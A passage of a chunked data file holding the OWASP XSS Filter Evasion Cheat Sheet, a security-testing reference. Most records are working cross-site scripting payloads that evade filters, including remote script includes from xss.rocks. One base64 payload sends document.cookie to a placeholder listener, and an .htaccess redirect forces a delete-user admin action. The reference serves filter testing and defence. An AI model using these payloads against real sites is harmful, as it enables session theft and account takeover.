+   "text": "onScroll() (user would need to scroll, or attacker could use the scrollBy() function)\n\nonSeek() (the onReverse event fires when the timeline is set to play in any direction other than forward)\n\nonSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\");)\n\nonSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\");)\n\nonSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\");)\n\nonStart() (fires at the beginning of each marquee loop)\n\nonStop() (user would need to press the stop button or leave the webpage)\n\nonStorage() (storage area changed)\n\nonSyncRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire)\n\nonSubmit() (requires attacker or user submits a form)\n\nonTimeError() (user or attacker sets a time property, such as dur, to an invalid value)\n\nonTrackChange() (user or attacker changes track in a playList)\n\nonUndo() (user went backward in undo transaction history)\n\nonUnload() (as the user clicks any link or presses the back button or attacker forces a click)\n\nonURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)\n\nseekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#042",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BODY Tag > BGSOUND",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<BGSOUND SRC=\"javascript:alert('XSS');\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#043",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BODY Tag > STYLE sheet",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#044",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Remote style sheet",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:\n\n```\n<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#045",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Remote style sheet > Remote style sheet part 2",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end </STYLE> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:\n\n```\n<STYLE>@import'http://xss.rocks/xss.css';</STYLE>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#046",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Remote style sheet > Remote style sheet part 3",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This only works in Gecko rendering engines and works by binding an XUL file to the parent page.\n\n```\n<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#047",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > STYLE Tags that Breaks Up JavaScript for XSS",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This XSS at times sends IE into an infinite loop of alerts:\n\n```\n<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#048",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > STYLE Attribute that Breaks Up an Expression",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">\n```\n\n(Created by Roman Ivanov)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#049",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > IMG STYLE with Expressions",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This is really a hybrid of the last two XSS vectors, but it really does show how hard STYLE tags can be to parse apart. This can send IE into a loop:\n\n```\nexp/*<A STYLE='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#050",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > STYLE Tag using Background-image",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#051",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > STYLE Tag using Background",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n<STYLE type=\"text/css\">BODY{background:url(\"<javascript:alert>('XSS')\")}</STYLE>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#052",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Anonymous HTML with STYLE Attribute",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "The IE rendering engine doesn't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:\n\n```\n<XSS STYLE=\"xss:expression(alert('XSS'))\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#053",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Local htc File",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This is a little different than the last two XSS vectors because it uses an .htc file that must be on the same server as the XSS vector. This example file works by pulling in the JavaScript and running it as part of the style attribute:\n\n```\n<XSS STYLE=\"behavior: url(xss.htc);\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#054",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > US-ASCII Encoding",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS method may bypass many content filters but it only works if the host transmits in US-ASCII encoding or if you set the encoding yourself. This is more useful against web application firewall (WAF) XSS evasion than it is server side filter evasion. Apache Tomcat is the only known server that by default still transmits in US-ASCII encoding.\n\n```\n¼script¾alert(¢XSS¢)¼/script¾\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#055",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > META",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:\n\n```\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#056",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > META > META using Data",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Directive URL scheme. This attack method is nice because it also doesn't have anything visible that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details.\n\n```\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#057",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > META > META with Additional URL Parameter",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "If the target website attempts to see if the URL contains <http://>; at the beginning you can evade this filter rule with the following technique:\n\n```\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">\n```\n\n(Submitted by Moritz Naumann)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#058",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > IFRAME",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "If iFrames are allowed there are a lot of other XSS problems as well:\n\n```\n<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#059",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > IFRAME Event Based",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "IFrames and most other elements can use event based mayhem like the following:\n\n```\n<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>\n```\n\n(Submitted by: David Cross)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#060",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > FRAME",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Frames have the same sorts of XSS problems as iFrames\n\n```\n<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#061",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > TABLE",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<TABLE BACKGROUND=\"javascript:alert('XSS')\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#062",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > TABLE > TD",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:\n\n```\n<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#063",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > DIV > DIV Background-image",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#064",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > DIV > DIV Background-image with Unicode XSS Exploit",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This has been modified slightly to obfuscate the URL parameter:\n\n```\n<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">\n```\n\n(Original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#065",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > DIV > DIV Background-image Plus Extra Characters",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "RSnake built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):\n\n```\n<DIV STYLE=\"background-image: url(\u0001javascript:alert('XSS'))\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#066",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > DIV > DIV Expression",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "A variant of this attack was effective against a real-world XSS filter by using a newline between the colon and expression:\n\n```\n<DIV STYLE=\"width: expression(alert('XSS'));\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#067",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Downlevel-Hidden Block",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Only works on the IE rendering engine - Trident. Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our XSS vector to exist. Or the system might try to add comment tags around something in a vain attempt to render it harmless. As we can see, that probably wouldn't do the job:\n\n```\n<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#068",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BASE Tag",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "(Works on IE in safe mode) This attack needs the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that many websites uses dynamically placed images like images/image.jpg rather than full paths. If the path includes a leading forward slash like /images/image.jpg, you can remove one slash from this vector (as long as there are two to begin the comment this will work):\n\n```\n<BASE HREF=\"javascript:alert('XSS');//\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#069",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > OBJECT Tag",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "If the system allows objects, you can also inject virus payloads that can infect the users, etc with the APPLET tag. The linked file is actually an HTML file that can contain your XSS:\n\n```\n<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#070",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > EMBED SVG Which Contains XSS Vector",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack only works in Firefox:\n\n```\n<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>\n```\n\n(Thanks to nEUrOO for this one)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#071",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > XML Data Island with CDATA Obfuscation",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This XSS attack works only in IE:\n\n```\n<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>\n<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#072",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Locally hosted XML with embedded JavaScript that is generated using an XML data island",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack is nearly the same as above, but instead it refers to a locally hosted (on the same server) XML file that will hold your XSS vector. You can see the result here:\n\n```\n<XML SRC=\"xsstest.xml\" ID=I></XML>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#073",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > HTML+TIME in XML",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack only works in IE and remember that you need to be between HTML and BODY tags for this to work:\n\n```\n<HTML><BODY>\n<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">\n<?import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">\n</BODY></HTML>\n```\n\n(This is how Grey Magic hacked Hotmail and Yahoo!)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#074",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Assuming you can only fit in a few characters and it filters against .js",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack allows you to rename your JavaScript file to an image as an XSS vector:\n\n```\n<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#075",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > SSI (Server Side Includes)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:\n\n```\n<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#076",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > PHP",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:\n\n```\n<? echo('<SCR)';\necho('IPT>alert(\"XSS\")</SCRIPT>'); ?>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#077",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > IMG Embedded Commands",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:\n\n```\n<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#078",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > IMG Embedded Commands > IMG Embedded Commands part II",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=\"httx://badguy.com/a.jpg\"> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector:\n\n```\nRedirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser\n```\n\n(Thanks to Timo for part of this)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#079",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Cookie Manipulation",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This method is pretty obscure but there are a few examples where <META is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):\n\n```\n<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#080",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > XSS Using HTML Quote Encapsulation",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow <SCRIPT> but don't allow <SCRIPT SRC... by way of a regex filter /\\<script\\[^\\>\\]+src/i, do the following:\n\n```\n<SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n```\n\nIf you are performing XSS on sites that allow <SCRIPT> but don't allow \\<script src... due to a regex filter that does /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i (This is an important one, because this regex has been seen in the wild):\n\n```\n<SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n```\n\nAnother XSS to evade the same filter: /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i:\n\n```\n<SCRIPT a=\">\" '' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n```\n\nYet another XSS that evades the same filter: /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i\n\nGenerally, we are not discussing mitigation techniques, but the only thing that stops this XSS example is, if you still want to allow <SCRIPT> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags), use this:\n\n```\n<SCRIPT \"a='>'\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n```\n\nAnd one last XSS attack to evade, /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i using grave accents (again, doesn't work in Firefox):\n\n```\n<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n```\n\nHere's an XSS example which works if the regex won't catch a matching pair of quotes but instead will find any quotes to terminate a parameter string improperly:\n\n```\n<SCRIPT a=\">'>\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n```\n\nThis XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:\n\n```\n<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#081",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "The following attacks work if http://www.google.com/ is programmatically disallowed:"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#082",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > IP Versus Hostname",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<A HREF=\"http://66.102.7.147/\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#083",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > URL Encoding",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#084",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > DWORD Encoding",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Note: there are other of variations of DWORD encoding - see the IP Obfuscation calculator below for more details:\n\n```\n<A HREF=\"http://1113982867/\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#085",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > Hex Encoding",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quote is not required:\n\n```\n<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#086",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > Octal Encoding",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc:\n\n```\n<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#087",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > Base64 Encoding",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#088",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > Mixed Encoding",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Let's mix and match base encoding and throw in some tabs and newlines (why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:\n\n```\n<A HREF=\"h\ntt  p://6   6.000146.0x7.147/\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#089",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > Protocol Resolution Bypass",
